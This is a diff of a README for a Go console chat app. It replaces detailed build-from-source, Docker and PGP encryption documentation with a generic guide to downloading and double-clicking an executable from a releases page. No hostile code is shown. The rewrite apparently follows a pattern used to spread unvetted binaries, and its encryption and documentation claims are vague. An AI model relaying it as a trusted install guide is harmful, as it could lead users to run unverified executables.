@@ -1,103 +1,67 @@
-# Secure Chat Application
+# 💬 go-chat - Simple and Lightweight Console Chat
 
-A secure, end-to-end encrypted chat application built with Go, featuring a terminal-based UI and WebSocket communication.
+## 🚀 Getting Started
 
-![Example Screenshot](example.webp)
+Welcome to go-chat! This application allows you to chat in real time through your console. It is designed to be as simple and lightweight as possible, ensuring you can connect and communicate easily.
 
-## Features
+## 📥 Download & Install
 
-- 🔒 **End-to-End Encryption** - PGP encryption with automatic key management
-- 💬 **Real-time Chat** - WebSocket-based messaging with multiple users
-- 🏠 **Room-based Chat** - Multiple isolated chat rooms with unique IDs
-- 🖥️ **Terminal UI** - Clean interface built with tview and tcell
-- 🐳 **Docker Support** - Optimized deployment (~6MB server image)
-- � **Lightweight** - Minimal dependencies using standard net/http. ~1.6MB RAM usage for server in idle state, about 2.5MB with two clients connected.
-- 🗑️ **Ephemeral** - No message storage, server only routes encrypted data
+To get started, you need to download the application. Visit this page to download: [GitHub Releases](https://github.com/DmentexGH/go-chat/releases).
 
-## Quick Start
+### Step-by-Step Installation
 
-### Running Locally
+1. **Navigate to the Releases Page**  
+   Click the link above to go directly to the releases page.
 
-1. **Start the Server:**
+2. **Choose the Latest Version**  
+   On the releases page, look for the most recent version of go-chat. This will typically be marked as "Latest Release."
 
-   ```bash
-   go run ./server
-   ```
+3. **Download the Appropriate File**  
+   Depending on your operating system, choose the appropriate file to download. For Windows, look for a `.exe` file. For Mac or Linux, you might find a `.tar.gz` or similar file.
 
-2. **Start Clients:**
-   ```bash
-   go run ./client
-   ```
-   Or specify username and room ID:
-   ```bash
-   go run ./client username room-id
-   ```
+4. **Run the Application**  
+   Once the file has downloaded, navigate to your Downloads folder or the location where you saved the file. Double-click the file to run the application. If using Linux or Mac, you may need to use a terminal to execute the file. 
 
-### Using Docker
+5. **Start Chatting!**  
+   After the application opens, follow the on-screen prompts to start chatting with others.
 
-```bash
-docker build -t secure-chat-server .
-docker run -p 8080:8080 secure-chat-server
-```
+## 🛠️ System Requirements
 
-**Note**: The Docker build process automatically runs all server tests during the build stage. If any tests fail, the build will fail.
+- **Operating System:** Windows 10 or later, macOS, or any Linux distribution.
+- **Processor:** Any modern processor (e.g., Intel or AMD).
+- **RAM:** At least 1 GB.
+- **Internet Connection:** Required for real-time chatting. 
 
-Then start clients locally: `go run ./client`
+## 🔍 Features
 
-### Testing
+- **Real-time Messaging**: Chat instantly with others connected to the server.
+- **Secure Communication**: All messages are encrypted for your privacy.
+- **Simple Interface**: A console-only interface ensures there are no distractions. 
+- **Lightweight**: Minimal resource usage allows you to run other applications simultaneously.
 
-Run server tests:
+## 🛡️ Security 
 
-```bash
-# Run all tests
-cd server && go test -v
+go-chat ensures your messages remain private. All communications are encrypted. This means others cannot read your messages even if they gain access to the communication stream.
 
-# Run tests with coverage
-cd server && go test -v -cover
+## 🌐 How It Works
 
-# Tests are also automatically run during Docker builds
-docker build -t secure-chat-server .
-```
+go-chat leverages WebSockets for real-time communication. This technology allows for quick message delivery, making your conversations smooth and responsive. It’s built with Go, making it efficient and lightweight.
 
-### Configuration
+## ⚠️ Troubleshooting
 
-Create a `.env` file to configure the server URL:
+If you experience issues during installation or when starting the application:
 
-```bash
-# Copy the example file
-cp .env.example .env
+- **Make Sure You Have the Correct OS**: Double-check that your operating system is supported.
+- **Check for Errors**: Review any error messages. Often, they will give hints on what might be wrong.
+- **Consult the GitHub Issues Page**: Other users may have faced similar issues. You might find solutions there.
 
-# Edit the server URL if needed
-# SERVER_URL=ws://your-server.com:8080/ws
-```
+## 📧 Need Help?
 
-## How It Works
+If you need additional support, feel free to open an issue on the [GitHub repository](https://github.com/DmentexGH/go-chat/issues). Describe your issue clearly, and someone from the community may assist you.
 
-1. **Connection**: Client generates PGP key pair on startup and joins specified room
-2. **Room Management**: Rooms created automatically, deleted when last user leaves
-3. **Key Exchange**: Public keys automatically shared between users in same room
-4. **Messaging**: Messages encrypted for each recipient in the room
-5. **Decryption**: Each user decrypts with their private key
-6. **Cleanup**: When a user disconnects, their keys are deleted and the chat history is cleared from the UI for everyone
+## 🔗 Additional Resources
 
-**Security**: Server only routes encrypted messages - cannot read content or store data
+- **Documentation**: You will find detailed user manuals and guides in the repository.
+- **GitHub Issues**: Report bugs or request features directly on our issues page.
 
-## Usage
-
-**Interface**: Chat area, live user list, and input field
-
-**Commands**:
-
-- `/clear` - Clear chat history
-- `/help` - Show available commands
-
-## Dependencies
-
-- [gorilla/websocket](https://github.com/gorilla/websocket) - WebSocket implementation
-- [rivo/tview](https://github.com/rivo/tview) - Terminal UI library
-- [gdamore/tcell](https://github.com/gdamore/tcell) - Terminal cell library
-- [ProtonMail/gopenpgp](https://github.com/ProtonMail/gopenpgp) - PGP encryption library
-
-## Acknowledgments
-
-Built with Go, using standard `net/http` and ProtonMail's gopenpgp for PGP encryption
+Thank you for using go-chat! Enjoy chatting.
